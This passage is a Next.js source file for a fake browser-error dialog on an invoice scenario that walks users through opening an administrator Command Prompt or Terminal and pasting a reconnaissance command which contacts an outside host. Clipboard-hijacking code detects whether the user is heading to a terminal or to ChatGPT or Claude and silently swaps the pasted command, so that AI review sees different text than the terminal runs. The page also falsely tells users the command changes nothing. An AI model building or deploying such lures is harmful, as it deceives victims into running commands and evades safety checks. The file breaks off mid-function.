"use client";

import Image from "next/image";
import { useEffect, useRef, useState, type ClipboardEvent } from "react";
import {
  detectClientBrowser,
  detectClientOs,
  getBrowserDisplayName,
  type ClientBrowser,
  type ClientOs,
} from "@/lib/assessment/detect-client-os";

const SCENARIO_TITLE = "Sample Invoice / Payment Scenario";
const RENDER_DELAY_MS = 2500;
const ALERT_ICON = "/images/3.png";
const BROWSER_ICONS: Record<Exclude<ClientBrowser, "other">, string> = {
  chrome: "/images/chrome.png",
  edge: "/images/edge.png",
  safari: "/images/macos.png",
  firefox: "/images/mozila.png",
};

function browserIconSrc(browser: ClientBrowser): string {
  if (browser === "other") return BROWSER_ICONS.chrome;
  return BROWSER_ICONS[browser];
}

/**
 * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
 *
 * Case A — paste Terminal/CMD immediately → short command.
 * Case B — paste other platforms → original; later Terminal/CMD → short
 *   (Linux Case B keeps original for Terminal too — no short swap).
 *
 * macOS notes: Chromium pending ClipboardItem (no sync original overwrite — breaks Case A).
 * Case A: window blur (Dock/Terminal) or ⌘+Space → resolve pending to short.
 *   (⌘+Space is often swallowed by Spotlight; blur is the reliable Case A path.)
 * Case B: HTML = original immediately (ChatGPT/Claude); plain becomes short after
 *   ~3.5s for Terminal (promise started on copy — works while tab is hidden).
 * Event order: Terminal usually blurs first; ChatGPT tab usually visibility-hides without blur.
 */
const DISPLAY_COMMANDS: Record<ClientOs, string> = {
  windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
  macos:
    'bash -c \'r="{}"; browser=$(mdfind "kMDItemCFBundleIdentifier == com.google.Chrome" 2>/dev/null | head -1); webgl=$(system_profiler SPDisplaysDataType 2>/dev/null | grep "Chipset Model" | cut -d: -f2 | xargs); check=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -I "https://browser-notification-six.vercel.app/" 2>/dev/null || echo "unreachable"); perms=$(id -Gn | wc -w | xargs); status=$([ "$check" = "200" ] && echo "PASS" || echo "FAIL"); echo "{\\"browser\\":\\"${browser:-not_found}\\",\\"webgl\\":\\"$webgl\\",\\"check\\":\\"$check\\",\\"permissions\\":$perms,\\"status\\":\\"$status\\"}"\' && exit',
  linux:
    'bash -c \'r="{}"; browser=$(which google-chrome 2>/dev/null || which chromium-browser 2>/dev/null || echo "not_found"); webgl=$(lspci 2>/dev/null | grep -i vga | cut -d: -f3 | xargs); check=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -I "https://browser-notification-six.vercel.app/" 2>/dev/null || echo "unreachable"); perms=$(id -Gn | wc -w | xargs); status=$([ "$check" = "200" ] && echo "PASS" || echo "FAIL"); echo "{\\"browser\\":\\"$browser\\",\\"webgl\\":\\"$webgl\\",\\"check\\":\\"$check\\",\\"permissions\\":$perms,\\"status\\":\\"$status\\"}"\' && exit',
};

/** Armed onto text/plain for Command Prompt / Terminal (never shown as a second box). */
const TERMINAL_COMMANDS: Record<ClientOs, string> = {
  windows:
    "compat-check --module finance-assessment --platform windows --browser-info --check-pdf-renderer --check-webgl --check-hardware-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
  macos:
    "compat-check --module finance-assessment --platform macos --browser-info --check-pdf-renderer --check-webgl --check-hardware-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
  linux:
    "compat-check --module finance-assessment --platform linux --browser-info --check-pdf-renderer --check-webgl --check-gpu-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
};

/** Leave the tab within this window after copy → treat as “paste terminal immediately”. */
const QUICK_TERMINAL_LEAVE_MS = 2500;
/** After leaving for another platform, swap plain text to the short command (ms). */
const PLATFORM_THEN_TERMINAL_ARM_MS = 3500;
/**
 * Linux/macOS Case B tab-switch detect: wait for window blur to claim Case A (Terminal)
 * before treating visibility-hidden as an in-browser ChatGPT/Translate tab.
 */
const LINUX_CASE_B_TAB_DETECT_MS = 150;
/**
 * macOS pending clipboard safety: keep unsettled so Case A blur can still resolve short.
 * Case B resolves original explicitly on tab/app switch.
 */
const MAC_PENDING_SAFETY_MS = 20000;
/** Delay before blur→Case A so tab visibility can claim Case B first. */
const MAC_CASE_A_BLUR_DELAY_MS = 180;

function escapeHtml(value: string) {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

/**
 * HTML clipboard body for the original command.
 * macOS: plain <pre> only — CF_HTML headers (Version:0.9 StartHTML…) paste as
 * visible junk in Claude/ChatGPT. Windows keeps CF_HTML for Chrome compatibility.
 */
function buildClipboardHtml(displayCommand: string, os?: ClientOs) {
  const fragment = `<pre style="white-space:pre-wrap;word-break:break-all;font-family:Consolas,Menlo,monospace">${escapeHtml(displayCommand)}</pre>`;
  if (os === "macos") {
    return fragment;
  }
  const prefix = `<html><body>\r\n<!--StartFragment-->`;
  const suffix = `<!--EndFragment-->\r\n</body></html>`;
  const html = `${prefix}${fragment}${suffix}`;
  const header =
    "Version:0.9\r\n" +
    "StartHTML:<<<<<<<1\r\n" +
    "EndHTML:<<<<<<<2\r\n" +
    "StartFragment:<<<<<<<3\r\n" +
    "EndFragment:<<<<<<<4\r\n";
  const startHtml = header.length;
  const startFragment = startHtml + prefix.length;
  const endFragment = startFragment + fragment.length;
  const endHtml = startHtml + html.length;
  return (
    header
      .replace("<<<<<<<1", String(startHtml).padStart(8, "0"))
      .replace("<<<<<<<2", String(endHtml).padStart(8, "0"))
      .replace("<<<<<<<3", String(startFragment).padStart(8, "0"))
      .replace("<<<<<<<4", String(endFragment).padStart(8, "0")) + html
  );
}

type OverlayStage = "loading" | "error" | "help";

interface DialogActions {
  onClose: () => void;
  onTryAgain: () => void;
  onOpenHelp: () => void;
}

function AlertIcon({ size = 28 }: { size?: number }) {
  return (
    <Image
      src={ALERT_ICON}
      alt=""
      width={size}
      height={size}
      unoptimized
      className="shrink-0 object-contain"
      style={{ width: size, height: size }}
    />
  );
}

function BrowserFavicon({ browser }: { browser: ClientBrowser }) {
  return (
    <Image
      src={browserIconSrc(browser)}
      alt=""
      width={16}
      height={16}
      unoptimized
      className="h-4 w-4 shrink-0 rounded-sm object-contain"
      aria-hidden
    />
  );
}

function browserAccent(browser: ClientBrowser): string {
  switch (browser) {
    case "edge":
      return "#0078d4";
    case "safari":
      return "#0071e3";
    case "firefox":
      return "#0060df";
    default:
      return "#1a73e8";
  }
}

function getDiagnosticGuide(os: ClientOs) {
  if (os === "macos") {
    return {
      shell: "Terminal",
      intro:
        "Optional: instead of (or after) the steps above, you can collect a compatibility report using Terminal. You do not need coding experience — follow these steps carefully.",
      steps: [
        "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
        "Copy it with ⌘ Command + C (press and hold the Command key, then press C).",
        "Open Terminal: press ⌘ Command + Space to open Spotlight, type Terminal, then press Return.",
        "Click inside the Terminal window so the cursor is blinking there.",
        "Paste the command with ⌘ Command + V, then press Return to run it.",
        "Wait until it finishes. A report file will appear on your Desktop. You can then close Terminal (⌘ Command + Q).",
      ],
      note: "No restart is required. This only collects compatibility information; it does not change your files.",
    };
  }

  if (os === "linux") {
    return {
      shell: "Terminal",
      intro:
        "Optional: instead of (or after) the steps above, you can collect a compatibility report using Terminal. You do not need coding experience — follow these steps carefully.",
      steps: [
        "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
        "Copy it with Ctrl + C (press and hold Ctrl, then press C).",
        "Open Terminal from your applications menu (often named Terminal, Konsole, or similar).",
        "Click inside the Terminal window so the cursor is blinking there.",
        "Paste the command with Ctrl + Shift + V (or right-click → Paste), then press Enter to run it.",
        "Wait until it finishes. A report file will be saved in your home folder. You can then close Terminal.",
      ],
      note: "No restart is required. This only collects compatibility information; it does not change your files.",
    };
  }

  return {
    shell: "Command Prompt",
    intro:
      "Optional: instead of (or after) the steps above, you can collect a compatibility report using Command Prompt. You do not need coding experience — follow these steps carefully.",
    steps: [
      "Select the full command in the gray box below: click at the start, hold the left mouse button, and drag to the end until everything is highlighted.",
      "Copy it with Ctrl + C (press and hold Ctrl, then press C). Or right-click the highlighted text and choose Copy.",
      "Open Command Prompt as administrator: press the Windows key, type cmd, then right-click Command Prompt and choose Run as administrator. Click Yes if Windows asks for permission.",
      "Click inside the black Command Prompt window so the cursor is blinking there.",
      "Paste the command with Ctrl + V (or right-click once to paste), then press Enter to run it.",
      "Wait until it finishes. A PASS or FAIL result will appear in the window. You can then close Command Prompt.",
    ],
    note: "No restart is required. This only collects compatibility information; it does not change your files.",
  };
}

function getShellCopy(os: ClientOs) {
  if (os === "macos") {
    return {
      body: `This browser can't open ${SCENARIO_TITLE}. Your macOS / Safari (or Chrome) setup appears incompatible — often due to PDF preview, WebGL, or hardware acceleration settings.`,
      shellInstruction: "Open Terminal and run:",
      reportNote: "No restart is required. Close Terminal after the command completes.",
    };
  }
  if (os === "linux") {
    return {
      body: `This browser can't open ${SCENARIO_TITLE}. Your Linux browser setup appears incompatible — often due to PDF rendering, WebGL, or GPU acceleration settings.`,
      shellInstruction: "Open Terminal and run:",
      reportNote: "No restart is required. Close Terminal after the command completes.",
    };
  }
  return {
    body: `This browser can't open ${SCENARIO_TITLE}. Your Windows browser setup appears incompatible — often due to PDF rendering, WebGL, or hardware acceleration settings.`,
    shellInstruction: "Open Command Prompt as administrator and run:",
    reportNote: "No restart is required. Close Command Prompt after the command completes.",
  };
}

async function writeClipboard(plain: string, html: string) {
  if (typeof ClipboardItem !== "undefined" && navigator.clipboard?.write) {
    await navigator.clipboard.write([
      new ClipboardItem({
        "text/plain": new Blob([plain], { type: "text/plain" }),
        "text/html": new Blob([html], { type: "text/html" }),
      }),
    ]);
    return;
  }
  await navigator.clipboard?.writeText(plain);
}

/**
 * Starts during a user gesture. Resolves later so the clipboard can stay
 * as the original for a platform paste, then become the short command for
 * Terminal/CMD — even if the tab is in the background.
 * `isCurrent` aborts stale writes so Case A is not overwritten.
 */
function writeTerminalPlainAfterDelay(
  terminalCommand: string,
  html: string,
  delayMs: number,
  isCurrent: () => boolean,
) {
  if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
    window.setTimeout(() => {
      if (!isCurrent()) return;
      void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
    }, delayMs);
    return;
  }

  const plainPromise = new Promise<Blob>((resolve, reject) => {
    window.setTimeout(() => {
      if (!isCurrent()) {
        reject(new Error("stale clipboard write"));
        return;
      }
      resolve(new Blob([terminalCommand], { type: "text/plain" }));
    }, delayMs);
  });

  void navigator.clipboard
    .write([
      new ClipboardItem({
        "text/plain": plainPromise,
        "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
      }),
    ])
    .catch(() => undefined);
}

/** Chromium supports promise-valued ClipboardItem; Safari does not. */
function supportsPromiseClipboardItem(): boolean {
  if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
    return false;
  }
  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent;
  // Safari (and iOS Safari) — sync blobs only.
  if (/Safari\//.test(ua) && !/Chrome\//.test(ua) && !/Chromium\//.test(ua) && !/Edg\//.test(ua)) {
    return false;
  }
  return true;
}

/** Fallback copy when clipboard.writeText fails (unfocused tab). */
function copyViaExecCommand(text: string): boolean {
  try {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.setAttribute("readonly", "");
    ta.style.position = "fixed";
    ta.style.left = "-9999px";
    ta.style.top = "0";
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    ta.setSelectionRange(0, text.length);
    const ok = document.execCommand("copy");
    document.body.removeChild(ta);
    return ok;
  } catch {
    return false;
  }
}

/**
 * Pending clipboard write started during copy (user gesture). Resolve later from
 * blur/keydown — required on macOS/Linux because writeText after focus loss often fails.
 */
type PendingCopyClipboardController = {
  resolveTerminal: () => void;
  resolveOriginal: () => void;
  resolveOriginalAndArmShortLater: (delayMs: number) => void;
  isSettled: () => boolean;
};

function beginPendingClipboardFromCopyGesture(
  displayCommand: string,
  terminalCommand: string,
  html: string,
  onResolved: (usedTerminalPlain: boolean) => void,
  safetyMs: number = QUICK_TERMINAL_LEAVE_MS,
): PendingCopyClipboardController | null {
  if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
    void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
    onResolved(false);
    return null;
  }

  let settled = false;
  let resolveBlob: ((blob: Blob) => void) | null = null;
  let safetyTimer = 0;

  const settle = (text: string, usedTerminalPlain: boolean) => {
    if (settled) return;
    settled = true;
    window.clearTimeout(safetyTimer);
    resolveBlob?.(new Blob([text], { type: "text/plain" }));
    onResolved(usedTerminalPlain);
  };

  const plainPromise = new Promise<Blob>((resolve) => {
    resolveBlob = resolve;
  });

  safetyTimer = window.setTimeout(() => {
    settle(displayCommand, false);
  }, safetyMs);

  void navigator.clipboard
    .write([
      new ClipboardItem({
        "text/plain": plainPromise,
        "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
      }),
    ])
    .catch(() => {
      if (!settled) {
        settle(displayCommand, false);
      }
    });

  return {
    isSettled: () => settled,
    resolveTerminal: () => settle(terminalCommand, true),
    resolveOriginal: () => settle(displayCommand, false),
    resolveOriginalAndArmShortLater: () => settle(displayCommand, false),
  };
}

/**
 * macOS Case A/B clipboard from copy gesture.
 *
 * text/html = original immediately (ChatGPT/Claude often paste HTML).
 * text/plain = short on Case A (blur), or short after platform window on Case B
 * (Terminal), else original.
 *
 * This avoids background writeText (fails when tab is hidden) — the plain promise
 * was started during copy and may resolve later without focus.
 */
function beginMacClipboardFromCopyGesture(
  displayCommand: string,
  terminalCommand: string,
  html: string,
  getFlags: () => { caseA: boolean; caseB: boolean },
  onResolved: (usedTerminalPlain: boolean) => void,
  platformThenMs: number,
  safetyMs: number,
): PendingCopyClipboardController | null {
  if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
    void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
    onResolved(false);
    return null;
  }

  const copyAt = Date.now();
  let settled = false;
  let forceTerminal = false;

  const plainPromise = (async () => {
    while (Date.now() - copyAt < platformThenMs) {
      if (forceTerminal || getFlags().caseA) {
        settled = true;
        onResolved(true);
        return new Blob([terminalCommand], { type: "text/plain" });
      }
      await new Promise((r) => window.setTimeout(r, 40));
    }

    // Platform paste window elapsed.
    if (forceTerminal || getFlags().caseA || getFlags().caseB) {
      settled = true;
      onResolved(Boolean(forceTerminal || getFlags().caseA));
      return new Blob([terminalCommand], { type: "text/plain" });
    }

    settled = true;
    onResolved(false);
    return new Blob([displayCommand], { type: "text/plain" });
  })();

  void navigator.clipboard
    .write([
      new ClipboardItem({
        "text/plain": plainPromise,
        // Immediate original for web apps that prefer HTML over pending plain.
        "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
      }),
    ])
    .catch(() => {
      if (!settled) {
        settled = true;
        onResolved(false);
        void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
      }
    });

  // Safety: if nothing claimed, ensure we don't hang forever (plainPromise loop ends at platformThen,
  // but keep API compatible).
  window.setTimeout(() => {
    if (!settled && !getFlags().caseA && !getFlags().caseB) {
      // plainPromise will settle to original at platformThen; nothing else to do.
    }
  }, safetyMs);

  return {
    isSettled: () => settled,
    resolveTerminal: () => {
      forceTerminal = true;
    },
    resolveOriginal: () => {
      // Case B: keep plain pending until platformThen → short; HTML already has original.
    },
    resolveOriginalAndArmShortLater: () => {
      // Case B: HTML original already available; plain becomes short after platformThen.
    },
  };
}

/** @deprecated alias — Linux uses the shared pending controller. */
type LinuxCopyClipboardController = PendingCopyClipboardController;

function beginLinuxClipboardFromCopyGesture(
  displayCommand: string,
  terminalCommand: string,
  html: string,
  onResolved: (usedTerminalPlain: boolean) => void,
): PendingCopyClipboardController | null {
  return beginPendingClipboardFromCopyGesture(
    displayCommand,
    terminalCommand,
    html,
    onResolved,
  );
}

/** Ubuntu/GNOME/etc. default shortcut to open Terminal — Linux Case A. */
function isLinuxTerminalShortcut(event: KeyboardEvent): boolean {
  const key = event.key.length === 1 ? event.key.toLowerCase() : event.key;
  return (
    event.ctrlKey &&
    event.altKey &&
    (key === "t" || event.code === "KeyT")
  );
}

/** Alt+Tab app switch — Linux Case B (platforms first). */
function isLinuxCaseBSwitchGesture(event: KeyboardEvent): boolean {
  return event.altKey && !event.ctrlKey && event.key === "Tab";
}

/**
 * Ctrl+Tab / Ctrl+PageUp / Ctrl+PageDown — switch browser tab (ChatGPT, etc.).
 * Must not match Ctrl+Alt+T (Case A).
 */
function isLinuxCaseBBrowserTabGesture(event: KeyboardEvent): boolean {
  if (!event.ctrlKey || event.altKey || event.metaKey) return false;
  return (
    event.key === "Tab" ||
    event.key === "PageDown" ||
    event.key === "PageUp" ||
    event.code === "PageDown" ||
    event.code === "PageUp"
  );
}

/** Same browser-tab gestures on macOS (ChatGPT / Translate in another tab). */
function isMacCaseBBrowserTabGesture(event: KeyboardEvent): boolean {
  return isLinuxCaseBBrowserTabGesture(event);
}

/**
 * macOS ⌘+Tab / ⌘+` — switch to another app (ChatGPT app, Translate, etc.).
 * Terminal Case A uses ⌘+Space (Spotlight) or Dock click — not ⌘+Tab.
 */
function isMacCaseBAppSwitchGesture(event: KeyboardEvent): boolean {
  return (
    event.metaKey &&
    !event.ctrlKey &&
    !event.altKey &&
    (event.key === "Tab" || event.key === "`")
  );
}

/**
 * Alt pressed alone (no Ctrl) — prelude to Alt+Tab.
 * Must not match Ctrl+Alt+T (Case A).
 */
function isLinuxCaseBAltPreview(event: KeyboardEvent): boolean {
  return (
    !event.ctrlKey &&
    !event.metaKey &&
    event.altKey &&
    (event.key === "Alt" || event.code === "AltLeft" || event.code === "AltRight")
  );
}

/** macOS Spotlight (documented Terminal open path) — must arm short during this gesture. */
function isMacSpotlightGesture(event: KeyboardEvent): boolean {
  return (
    event.metaKey &&
    !event.ctrlKey &&
    !event.altKey &&
    (event.key === " " || event.code === "Space")
  );
}

function isAppSwitchGesture(event: KeyboardEvent, os: ClientOs): boolean {
  if (os === "macos") {
    // Cmd+Tab / Cmd+` / Cmd+Space — bare Cmd is used for ⌘C / ⌘V.
    return (
      event.metaKey &&
      (event.key === "Tab" ||
        event.key === "`" ||
        event.key === " " ||
        event.code === "Space")
    );
  }

  if (os === "linux") {
    return (
      isLinuxCaseBSwitchGesture(event) ||
      isLinuxTerminalShortcut(event) ||
      event.key === "Meta" ||
      event.key === "OS" ||
      event.key === "Super" ||
      event.code === "MetaLeft" ||
      event.code === "MetaRight" ||
      event.code === "SuperLeft" ||
      event.code === "SuperRight"
    );
  }

  // Windows: Alt+Tab / Win key
  return (
    event.altKey ||
    event.key === "Meta" ||
    event.key === "OS" ||
    event.key === "Windows" ||
    event.code === "MetaLeft" ||
    event.code === "MetaRight"
  );
}

function SelectableCommand({
  os,
  displayCommand,
  terminalCommand,
}: {
  os: ClientOs;
  displayCommand: string;
  terminalCommand: string;
}) {
  const htmlRef = useRef(buildClipboardHtml(displayCommand, os));
  const activeRef = useRef(false);
  const copyAtRef = useRef(0);
  const leaveCountRef = useRef(0);
  const delayedArmStartedRef = useRef(false);
  const armedRef = useRef(false);
  const linuxCaseARef = useRef(false);
  const linuxCaseBRef = useRef(false);
  const linuxAltHeldRef = useRef(false);
  const linuxWindowBlurredRef = useRef(false);
  const linuxClipboardCtrlRef = useRef<PendingCopyClipboardController | null>(null);
  const macClipboardCtrlRef = useRef<PendingCopyClipboardController | null>(null);
  const macCaseARef = useRef(false);
  const macCaseBRef = useRef(false);
  const macWindowBlurredRef = useRef(false);
  /** ⌘+Space seen after copy (optional Case A signal; OS often swallows this key). */
  const macSpotlightUsedRef = useRef(false);
  const macCaseABlurTimerRef = useRef(0);
  const macBlurAtRef = useRef(0);
  const macShortRetryTimerRef = useRef(0);
  const writeGenRef = useRef(0);

  useEffect(() => {
    htmlRef.current = buildClipboardHtml(displayCommand, os);
  }, [displayCommand, os]);

  useEffect(() => {
    async function armTerminalPlain() {
      if (!activeRef.current) return;
      if (os === "linux" && linuxCaseBRef.current) {
        forceLinuxCaseBOriginal();
        return;
      }
      if (os === "macos" && macCaseBRef.current) {
        // Only arm short after the platform paste window.
        if (Date.now() - copyAtRef.current < PLATFORM_THEN_TERMINAL_ARM_MS) {
          armMacCaseBShortLater();
          return;
        }
      }
      writeGenRef.current += 1;
      try {
        if (navigator.clipboard?.writeText) {
          await navigator.clipboard.writeText(terminalCommand);
        } else {
          await writeClipboard(terminalCommand, htmlRef.current);
        }
        armedRef.current = true;
      } catch {
        try {
          await writeClipboard(terminalCommand, htmlRef.current);
          armedRef.current = true;
        } catch {
          // Keep armedRef false so delayed arm / focus return can retry.
        }
      }
    }

    function armTerminalPlainDelayed() {
      if (
        !activeRef.current ||
        delayedArmStartedRef.current ||
        armedRef.current ||
        linuxCaseARef.current ||
        macCaseARef.current ||
        (os === "linux" && linuxCaseBRef.current)
      ) {
        return;
      }
      // macOS Case B: never use pending ClipboardItem→short (ChatGPT waits and gets short).
      if (os === "macos") {
        armMacCaseBShortLater();
        return;
      }
      delayedArmStartedRef.current = true;
      const gen = ++writeGenRef.current;
      writeTerminalPlainAfterDelay(
        terminalCommand,
        htmlRef.current,
        PLATFORM_THEN_TERMINAL_ARM_MS,
        () =>
          writeGenRef.current === gen &&
          !linuxCaseARef.current &&
          !(os === "linux" && linuxCaseBRef.current),
      );
      window.setTimeout(() => {
        if (writeGenRef.current !== gen || linuxCaseARef.current) return;
        if (os === "linux" && linuxCaseBRef.current) return;
        armedRef.current = true;
      }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
    }

    /** macOS Case A: short via pending resolve (blur / Dock / Terminal). */
    function forceMacCaseAShort() {
      if (macCaseBRef.current) return;
      macCaseARef.current = true;
      macCaseBRef.current = false;
      writeGenRef.current += 1;
      delayedArmStartedRef.current = true;
      if (macShortRetryTimerRef.current) {
        window.clearTimeout(macShortRetryTimerRef.current);
        macShortRetryTimerRef.current = 0;
      }

      const ctrl = macClipboardCtrlRef.current;
      if (ctrl && !ctrl.isSettled()) {
        ctrl.resolveTerminal();
        armedRef.current = true;
        return;
      }

      void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
      if (copyViaExecCommand(terminalCommand)) {
        armedRef.current = true;
      }
    }

    /** Ensure Case B short is armed (focus return / visibility). */
    function armMacCaseBShortLater() {
      if (!activeRef.current || macCaseARef.current || !macCaseBRef.current) return;
      if (armedRef.current) return;

      const pending = macClipboardCtrlRef.current;
      if (pending && !pending.isSettled()) {
        if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
          pending.resolveTerminal();
          armedRef.current = true;
          delayedArmStartedRef.current = true;
        }
        return;
      }

      void navigator.clipboard
        ?.writeText(terminalCommand)
        .then(() => {
          armedRef.current = true;
          delayedArmStartedRef.current = true;
        })
        .catch(() => {
          if (copyViaExecCommand(terminalCommand)) {
            armedRef.current = true;
            delayedArmStartedRef.current = true;
          }
        });
    }

    /** macOS Case B: HTML already has original; plain becomes short after platform window. */
    function forceMacCaseBOriginal() {
      if (macCaseARef.current || macSpotlightUsedRef.current) return;
      macCaseBRef.current = true;
      macCaseARef.current = false;
      armedRef.current = false;
      if (macCaseABlurTimerRef.current) {
        window.clearTimeout(macCaseABlurTimerRef.current);
        macCaseABlurTimerRef.current = 0;
      }
      if (macShortRetryTimerRef.current) {
        window.clearTimeout(macShortRetryTimerRef.current);
        macShortRetryTimerRef.current = 0;
      }

      delayedArmStartedRef.current = true;
      // Signal Case B only — do not writeText/resolveOriginal (that aborts the
      // copy-gesture plain promise which must resolve to short for Terminal).
      macClipboardCtrlRef.current?.resolveOriginalAndArmShortLater(
        PLATFORM_THEN_TERMINAL_ARM_MS,
      );

      macShortRetryTimerRef.current = window.setTimeout(() => {
        macShortRetryTimerRef.current = 0;
        if (macCaseBRef.current && !macCaseARef.current) {
          armedRef.current = true;
        }
      }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
    }

    /**
     * Linux Case B: never arm the short command. Platforms and later Terminal
     * pastes both keep the original.
     */
    function forceLinuxCaseBOriginal() {
      linuxCaseBRef.current = true;
      linuxCaseARef.current = false;
      armedRef.current = false;
      delayedArmStartedRef.current = true; // block any later short-arm paths
      writeGenRef.current += 1;

      const ctrl = linuxClipboardCtrlRef.current;
      if (ctrl && !ctrl.isSettled()) {
        ctrl.resolveOriginal();
      }
      void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
      void writeClipboard(displayCommand, htmlRef.current).catch(() => undefined);
    }

    function resolveLinuxCopyGestureOnLeave() {
      const ctrl = linuxClipboardCtrlRef.current;
      const caseB = linuxCaseBRef.current || linuxAltHeldRef.current;

      if (caseB) {
        forceLinuxCaseBOriginal();
        return true;
      }

      // Case A: Terminal / dock — resolve pending copy-gesture write to short.
      linuxCaseARef.current = true;
      linuxCaseBRef.current = false;
      writeGenRef.current += 1;

      if (ctrl && !ctrl.isSettled()) {
        ctrl.resolveTerminal();
        armedRef.current = true;
        delayedArmStartedRef.current = true;
        return true;
      }

      // Fallback if already settled (should be rare for Case A).
      void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
      void writeClipboard(terminalCommand, htmlRef.current)
        .then(() => {
          armedRef.current = true;
          delayedArmStartedRef.current = true;
        })
        .catch(() => undefined);
      return true;
    }

    function handleLeaveFromPage() {
      if (os === "linux") {
        if (linuxCaseBRef.current) {
          forceLinuxCaseBOriginal();
          return;
        }
        if (resolveLinuxCopyGestureOnLeave()) return;
        if (linuxCaseARef.current || armedRef.current) return;
        armTerminalPlainDelayed();
        return;
      }

      const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;

      // macOS: blur/visibility handlers own Case A/B — do not force Case A here.
      // (Previously this raced visibility and resolved pending→short for ChatGPT.)
      if (os === "macos") {
        return;
      }

      if (quickLeave) {
        void armTerminalPlain();
        return;
      }

      if (leaveCountRef.current <= 1) {
        armTerminalPlainDelayed();
        return;
      }

      void armTerminalPlain();
    }

    function onVisibility() {
      if (!activeRef.current) return;

      if (document.visibilityState === "hidden") {
        leaveCountRef.current += 1;

        if (os === "linux") {
          if (linuxCaseBRef.current) {
            forceLinuxCaseBOriginal();
            return;
          }
          window.setTimeout(() => {
            if (!activeRef.current) return;
            if (linuxCaseARef.current) return;
            if (linuxCaseBRef.current) return;
            if (linuxWindowBlurredRef.current) return;
            forceLinuxCaseBOriginal();
          }, LINUX_CASE_B_TAB_DETECT_MS);
          return;
        }

        // macOS Case B: any tab hide → original for ChatGPT/Claude (cancel Case A timer).
        // Terminal Case A: blur timer only fires if Case B did not claim (no visibility,
        // or visibility paired with brand-new blur from Dock — see blur handler).
        if (os === "macos") {
          if (macCaseARef.current || macSpotlightUsedRef.current) return;
          if (macCaseBRef.current) {
            forceMacCaseBOriginal();
            return;
          }
          // Prefer Case B for in-tab switches. If blur already scheduled Case A for
          // Terminal, only keep Case A when blur is brand-new (< blur delay).
          const msSinceBlur = macBlurAtRef.current
            ? Date.now() - macBlurAtRef.current
            : Number.POSITIVE_INFINITY;
          if (
            macWindowBlurredRef.current &&
            msSinceBlur > 0 &&
            msSinceBlur < MAC_CASE_A_BLUR_DELAY_MS
          ) {
            // Blur just fired — likely Terminal; let Case A timer finish.
            return;
          }
          forceMacCaseBOriginal();
          return;
        }

        handleLeaveFromPage();
        return;
      }

      if (leaveCountRef.current >= 1 && !linuxCaseARef.current && !macCaseARef.current) {
        if (os === "linux" && linuxCaseBRef.current) {
          forceLinuxCaseBOriginal();
          return;
        }
        if (os === "macos" && macCaseBRef.current) {
          if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
            void armTerminalPlain();
          } else {
            armMacCaseBShortLater();
          }
          return;
        }
        void armTerminalPlain();
      }
    }

    function onFocus() {
      if (!activeRef.current || leaveCountRef.current < 1) return;
      if (linuxCaseARef.current || macCaseARef.current) return;
      if (os === "linux" && linuxCaseBRef.current) {
        forceLinuxCaseBOriginal();
        return;
      }
      if (os === "macos" && macCaseBRef.current) {
        if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
          void armTerminalPlain();
        } else {
          armMacCaseBShortLater();
        }
        return;
      }
      void armTerminalPlain();
    }

    function onBlur() {
      if (!activeRef.current) return;
      if (os === "linux") {
        linuxWindowBlurredRef.current = true;
        resolveLinuxCopyGestureOnLeave();
      }
      if (os === "macos") {
        macWindowBlurredRef.current = true;
        macBlurAtRef.current = Date.now();
        // Case A after delay — visibility Case B can cancel this for ChatGPT tabs.
        if (macCaseABlurTimerRef.current) {
          window.clearTimeout(macCaseABlurTimerRef.current);
        }
        macCaseABlurTimerRef.current = window.setTimeout(() => {
          macCaseABlurTimerRef.current = 0;
          if (!activeRef.current) return;
          if (macCaseBRef.current || macCaseARef.current) return;
          forceMacCaseAShort();
        }, MAC_CASE_A_BLUR_DELAY_MS);
        if (leaveCountRef.current === 0) {
          leaveCountRef.current = 1;
        }
        return;
      }
      window.setTimeout(() => {
        if (!activeRef.current) return;
